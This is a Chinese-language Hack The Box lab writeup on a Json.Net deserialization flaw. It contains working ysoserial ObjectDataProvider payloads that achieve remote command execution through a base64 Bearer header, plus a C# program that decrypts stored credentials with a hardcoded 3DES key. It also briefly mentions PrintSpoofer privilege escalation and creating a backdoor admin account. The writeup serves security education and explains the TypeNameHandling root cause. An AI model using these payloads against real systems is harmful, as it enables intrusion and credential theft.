---
title: Json.Net Unserialize (Hack The Box Writeup)
date: 2022-10-11T17:03:42+08:00
draft: false
url: "/2022/10/11/json-net-unserialize-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

URL : https://app.hackthebox.com/machines/210

這篇文會從黑箱跟白箱兩個角度來試著了解漏洞的成因與 Exploit 方法，省略一些掃描的過程，直接進入滲透步驟。

## Black Box

http://10.129.227.191/login.html

是一個登入介面，透過弱密碼 `admin` / `admin` 可以進入後台。

觀察登入狀態，可以看出我們是 Post 一個 Json 來進行登入，而登入後會幫我們 Set 一組 Cookie，從 Response 的 Header 可以看出這是一個 IIS 的 Server。

![](https://i.imgur.com/ymKD0rK.png)

這邊可以猜測說，登入後他應該會把 Json 解析或反序列化到某個物件之中，那我們可以試著看看，如果我們給他一個壞掉的 Json 會發生什麼事，例如下圖給他一個最後缺少 `"` 的 Json，發現他會噴錯。

![](https://i.imgur.com/vBp32ZR.png)

```
at DemoApp.Data.UsuariosData.GetMd5Hash(String input)
   at DemoApp.Data.UsuariosData.Autenticar(String usuario, String password)
   at DemoAppExplanaiton.Controllers.AccountController.Login(Usuario login) in C:\Users\admin\source\repos\DemoAppExplanaiton\DemoAppExplanaiton\Controllers\AccountController.cs:line 24
   at lambda_method(Closure , Object , Object[] )
   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ActionExecutor.<>c__DisplayClass6_2.b__2(Object instance, Object[] methodParameters)
   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ExecuteAsync(HttpControllerContext controllerContext, IDictionary`2 arguments, CancellationToken cancellationToken)
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at System.Web.Http.Controllers.ApiControllerActionInvoker.d__1.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at System.Web.Http.Controllers.ActionFilterResult.d__5.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at System.Web.Http.Dispatcher.HttpControllerDispatcher.d__15.MoveNext()"%
```

然而，這些錯誤並沒有太大的幫助 QQ，接下來我們觀察正確的登入後，他吐出來的餅乾是啥。很直覺可以知道他是一個 base64

```bash
echo -n 'eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=' | base64 -d
{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
```

接下來我們觀察登入進去後，會自動去 call `/api/Account/`

![](https://i.imgur.com/YLRTURK.png)

我們可以發現， Post 的 `Bearer` 跟餅乾長一樣，而 Response 就是餅乾解開的東西。

丟到 Repeater 測了一輪發現，其實在這邊，餅乾(也許)是沒用的，因為我們只保留 Bearer 也可以順利被解開。

![](https://i.imgur.com/schowLY.png)

如果我們試著自己偽造一個 Json 轉 Base64，他一樣可以順利解開

```bash
echo -n '{"Id": 9999,"UserName":"meow","Password":"meowmeow","Name":"User Admin HTB","Rol":"Administrator"}' | base64
eyJJZCI6IDk5OTksIlVzZXJOYW1lIjoibWVvdyIsIlBhc3N3b3JkIjoibWVvd21lb3ciLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=
```

那如果我們故意給他一個壞掉的 Json ，看他會發生啥事 (最後面少一個 `"`)

```bash
echo -n '{"Id": 9999,"UserName":"meow","Password":"meowmeow","Name":"User Admin HTB","Rol":"Administrator}' | base64
eyJJZCI6IDk5OTksIlVzZXJOYW1lIjoibWVvdyIsIlBhc3N3b3JkIjoibWVvd21lb3ciLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yfQ==
```

發現 Server 的 Response 是

```json
{
  "Message": "An error has occurred.",
  "ExceptionMessage": "Cannot deserialize Json.Net Object",
  "ExceptionType": "System.Exception",
  "StackTrace": null
}
```

這邊就出現了令人眼睛一亮的關鍵字 ： `deserialize Json.Net`

事實上， `ysoserial.net` 早就有提供好 Json.Net 的 Formatter 了，我們可以使用熟悉的 Gadget `ObjectDataProvider` 來進行反序列化。 如果不知道 `ObjectDataProvider` 可以去參考我[先前的文章](/2022/09/13/net-反序列化攻擊-101/)。

```
.\ysoserial.exe -g  ObjectDataProvider -f Json.Net -c "ping 10.10.16.35"
```

會產出

```json
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c ping 10.10.16.35']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

直接幫他轉 Base64 後丟進去，會發現噴錯了 QQ

![](https://i.imgur.com/IqNcwuc.png)

但錯誤不重要，我們的 TCPDump 有順利噴出結果！代表我們已經 RCE 了！

![](https://i.imgur.com/D7oavkW.png)

既然可以 RCE 了，後面就各種方法都可以打 Shell 出來，再來用 PrintSpoofer 就能提權了，後面步驟都很簡單就不贅述ㄌ。

我拿到 System 後，先自己創了一個 Admin 使用者，並把 RDP 打開，上去試著使用白箱的角度進行 Code Review。

## White Box

RDP 打開後，把 dnSpy 丟進去試著 Reverse DLL，就可以看到主要的登入邏輯在 `DemoApp.Data.dll`

### 登入部分

去追一下 DemoApp.Data.dll 可以看到兩個重點

```csharp
public Usuario Autenticar(string usuario, string password)
{
    string json = File.ReadAllText(this.Folder + "\\dbdata\\userscredentials.json");
    json = Crypto.Decrypt(ConfigurationManager.AppSettings["IV"], json, true);
    string hash = this.GetMd5Hash(password);
    IEnumerable result = from u in JsonConvert.DeserializeObject>(json)
    where u.UserName == usuario && u.Password == hash
    select u;
    if (result.Any())
    {
        return result.FirstOrDefault();
    }
    return null;
}
```

首先他會從 `\\dbdata\\userscredentials.json` 讀取值

我們直接開啟對應的檔案，可以知道值是

```
/NIPCn7IDz/eBm3RkJRB/0fbUM8D69U/PBeyksExcqXNOPHCEt+9THcjFNTxAiTy/JtsBx2oy9nPJ05RFGLX2aAhIddIVgeM9CRNT2+ILr2uS3mwp+FSHYU2V1ulFwgDYv7kb+Wzaw/iwfq5Wf8zA15zBzmWgP2WjxvQTvIhor3eQBsQc851KkHjCVZrMi0FurubwZUTAxCWAQtc+WsguJTssEW69XRIUCqx63666jpnQji3wgRLzYCJ2nvdEJwgECWGWSWTkH6pQKgS+QiqjnPhXRbV3QnWY3oB4VhGNi+Joez+7M9fvWy8x36YOEKAiGohv+9OjYBvfPcCLyIX80f+99CD0l26D6duabrybvg27/2YhXQ3MuANTkoeZqXMIJZytHIbdbR4AyfTdNvUds5XGLZHjIxi3ZDXz5ffb+lIEh4jA1gMyJ5pbKilnv6b0vXFjAFjEKWxuaT42yddQw==
```

接下來程式會把值送到 `Crypto.Decrypt` 中，這邊的 Crypto class 是他們自己定義的

```csharp
public static string Decrypt(string key, string cipherString, bool useHashing)
{
    byte[] toEncryptArray = Convert.FromBase64String(cipherString);
    byte[] keyArray;
    if (useHashing)
    {
        MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
        keyArray = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(key));
        md5CryptoServiceProvider.Clear();
    }
    else
    {
        keyArray = Encoding.UTF8.GetBytes(key);
    }
    TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
    tripleDESCryptoServiceProvider.Key = keyArray;
    tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
    tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
    byte[] resultArray = tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
    tripleDESCryptoServiceProvider.Clear();
    return Encoding.UTF8.GetString(resultArray);
}
```

看一眼可以發現他是使用 ECB 模式的 3DES，這邊我們還需要尋找他的 Key 在哪裡，其實這邊的 Key 應該就是 Decrypt Key 了，而不是 IV (Initial Vector)，感覺怪怪的 www ，但不影響解答。

Key 的來源是 `ConfigurationManager.AppSettings["IV"]` ，這邊的值就來自於 Web.Config

```xml

```

蒐集完這些資料，我們就具備自己寫一個解密程式的能力了！

```csharp
using System;
using System.IO; 
using System.Security.Cryptography;
using System.Text;

namespace poc_class{
    class Program{
        static void Main(string[] args){
            string IV = "uLdDJr^B9bkbf0PdJGHA2UMHEGz";
            string usercredentials = "/NIPCn7IDz/eBm3RkJRB/0fbUM8D69U/PBeyksExcqXNOPHCEt+9THcjFNTxAiTy/JtsBx2oy9nPJ05RFGLX2aAhIddIVgeM9CRNT2+ILr2uS3mwp+FSHYU2V1ulFwgDYv7kb+Wzaw/iwfq5Wf8zA15zBzmWgP2WjxvQTvIhor3eQBsQc851KkHjCVZrMi0FurubwZUTAxCWAQtc+WsguJTssEW69XRIUCqx63666jpnQji3wgRLzYCJ2nvdEJwgECWGWSWTkH6pQKgS+QiqjnPhXRbV3QnWY3oB4VhGNi+Joez+7M9fvWy8x36YOEKAiGohv+9OjYBvfPcCLyIX80f+99CD0l26D6duabrybvg27/2YhXQ3MuANTkoeZqXMIJZytHIbdbR4AyfTdNvUds5XGLZHjIxi3ZDXz5ffb+lIEh4jA1gMyJ5pbKilnv6b0vXFjAFjEKWxuaT42yddQw==";
            string res = Decrypt(IV,usercredentials,true);
            Console.WriteLine(res);

        }

        public static string Decrypt(string key, string cipherString, bool useHashing)
        {
            byte[] toEncryptArray = Convert.FromBase64String(cipherString);
            byte[] keyArray;
            if (useHashing)
            {
                MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
                keyArray = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(key));
                md5CryptoServiceProvider.Clear();
            }
            else
            {
                keyArray = Encoding.UTF8.GetBytes(key);
            }
            TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
            tripleDESCryptoServiceProvider.Key = keyArray;
            tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
            tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
            byte[] resultArray = tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
            tripleDESCryptoServiceProvider.Clear();
            return Encoding.UTF8.GetString(resultArray);
        }
    }
}

// csc /t:exe /out:poc.exe poc.cs
```

輸出結果是

```
[
    {
      "Id": 1,
      "UserName": "admin",
      "Password": "21232f297a57a5a743894a0e4a801fc3",
      "Name": "User Admin HTB",
      "Rol": "Administrator"
    },
    {
      "Id": 1,
      "UserName": "ansible",
      "Password": "5f4dcc3b5aa765d61d8327deb882cf99",
      "Name": "User",
      "Rol": "User"
    }
  ]
```

Google 一下就知道， `admin` 密碼是 `admin`，`ansible` 密碼是 `password`

繼續看下去

```csharp
IEnumerable result = from u in JsonConvert.DeserializeObject>(json)
```

這行會把內容給透過 Json 來進行 Decode，Usuario 是程式自己定義的一個 Class，裡面存放了各種使用者的資料。

接下來我們可以自己 Compile 一個 Serialize 進行測試

```csharp
using System;
using System.IO; 
using System.Security.Cryptography;
using System.Text;
using Newtonsoft.Json;

namespace poc_class{
    public class Usuario
    {
        public int Id { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
        public string Name { get; set; }
        public string Rol { get; set; }
    }

    class Program{
        static void Main(string[] args){
            Usuario u = new Usuario();
            u.Id = 2;
            u.UserName = "meow";
            u.Password = "MeowPass";
            u.Name = "Meow Meow";
            u.Rol = "Administrator";

            string serialized = JsonConvert.SerializeObject(u,
                Formatting.Indented,
                new JsonSerializerSettings { });

            Console.WriteLine(serialized);
}

// csc /reference:Newtonsoft.Json.dll /t:exe /out:poc.exe poc.cs
// 先把 ysoserial 裡面的 Newtonsoft.Json.dll 丟到同一個資料夾
```

可以順利出現

```json
{
  "Id": 2,
  "UserName": "meow",
  "Password": "MeowPass",
  "Name": "Meow Meow",
  "Rol": "Administrator"
}
```

正常我們要反序列化的話，只需要用下列的指令就能進行反序列化。

```csharp
Usuario u1 = JsonConvert.DeserializeObject(serialized);
Console.WriteLine(u1.Rol);
```

而這一段是沒有漏洞的！

### Json.Net 反序列化

我們可以自己做一個小小的 Poc 來達成反序列化

```csharp
// ... 略
static void Main(string[] args){
    ObjectDataProvider odp = new ObjectDataProvider();
    odp.ObjectInstance = new Meow();
    odp.MethodName = "Meowww";

    string serialized = JsonConvert.SerializeObject(odp,
        new JsonSerializerSettings { TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full,
        TypeNameHandling = TypeNameHandling.All}
    );

    var u1 = JsonConvert.DeserializeObject(serialized, new JsonSerializerSettings{
        TypeNameHandling = TypeNameHandling.All
    });
}

public class Meow{
    public void Meowww(){
        Console.WriteLine("Hello Meow Meow!");
    }
}
```

這樣執行起來會出現兩次的 `Hello Meow Meow!`，第一次是我們建立 ObjectDataProvider 時的，一次是反序列化時的。

這邊序列化的重點在於 `TypeNameHandling = TypeNameHandling.All` 的這個參數，只要 TypeNameHandling 不為預設的 None，都會有相關的弱點產生，反序列化過程中都會去讀取 Class 的內容。

[https://learn.microsoft.com/en-us/dotnet/fundamentals/code-analysis/quality-rules/ca2326](https://learn.microsoft.com/en-us/dotnet/fundamentals/code-analysis/quality-rules/ca2326)

```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","ObjectInstance":{"$type":"poc_class.Meow, poc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null"},"MethodName":"Meowww","IsAsynchronous":false,"IsInitialLoadEnabled":true,"Data":null,"Error":null}
```

我們直接塞入 ysoserial 的 payload，也可以順利的 RCE

```csharp
string serialized = "{'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',    'MethodName':'Start',    'MethodParameters':{        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',        '$values':['cmd', '/c calc.exe']    },    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}";
```

### ysoserial

可以直接 Clone 下 ysoserial 的 Source Code，並在 command line 加入以下參數

```
--debugmode -g ObjectDataProvider -f Json.Net -c 'calc.exe'
```

![](https://i.imgur.com/mmFSTJB.png)

追進去會發現，產 Code 的地方在

```csharp
// ObjectDataProviderGenerator.cs L190

String payload = @"{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':[" + cmdPart + @"]
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
```

所以他其實是寫死的一段 Payload 而已

回來比對我們上面的程式碼，我們的 Serial 結果如以下，而 IsAsynchronous, IsInitialLoadEnabled, Data, Error 都可以刪掉，不影響結果

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "ObjectInstance": {
    "$type": "poc_class.Meow, poc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null"
  },
  "MethodName": "Meowww",
  "IsAsynchronous": false,
  "IsInitialLoadEnabled": true,
  "Data": null,
  "Error": null
}
```

來對比一下 ysoserial 產出的結果

```json
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

看起來是差不多的結果 (這邊單雙引號不影響結果)，就只是變了 MethodParameters 以及 ObjectInstance 去呼叫`System.Diagnostics.Process.Start`，並傳入一個 ArrayList。

### Code Review

回到 HTB 的這題，我們來看一下 `DemoAppExplanaition.dll`

```csharp
[Login]
[Route("api/Account/")]
[HttpGet]
public HttpResponseMessage GetInfo()
{
    string cookie = HttpContext.Current.Request.Headers["Bearer"];
    HttpResponseMessage result;
    try
    {
        byte[] b = Convert.FromBase64String(cookie);
        string b2 = Encoding.UTF8.GetString(b);
        object obj = JsonConvert.DeserializeObject(b2, new JsonSerializerSettings
        {
            TypeNameHandling = TypeNameHandling.Auto
        });
        JObject users = (JObject)obj;
        result = base.Request.CreateResponse(HttpStatusCode.OK, users);
    }
    catch (FormatException fe)
    {
        result = base.Request.CreateErrorResponse(HttpStatusCode.InternalServerError, new Exception("Invalid format base64"));
    }
    catch (JsonReaderException je)
    {
        result = base.Request.CreateErrorResponse(HttpStatusCode.InternalServerError, new Exception("Cannot deserialize Json.Net Object"));
    }
    return result;
}
}
```

這邊的程式碼 DeserializeObject 的地方，出現了我們喜歡的 `TypeNameHandling = TypeNameHandling.Auto`

程式會直接把 Header 中的 Bearer 解 Base64 後，塞進去反序列化，所以我們可以無腦的塞 ysoserial 的結果進去，就能 RCE 了！

## Summary

Json.Net 的反序列化漏洞條件是，序列化以及反序列化的參數 (JsonSerializerSettings) 中，`TypeNameHandling` 不為 None，然後就能無腦套 Ysoserial 了！

## Reference

- https://www.cnblogs.com/nice0e3/p/15294585.html
- https://www.freebuf.com/articles/network/333729.html
- https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net
- https://learn.microsoft.com/zh-tw/dotnet/fundamentals/code-analysis/quality-rules/ca2326
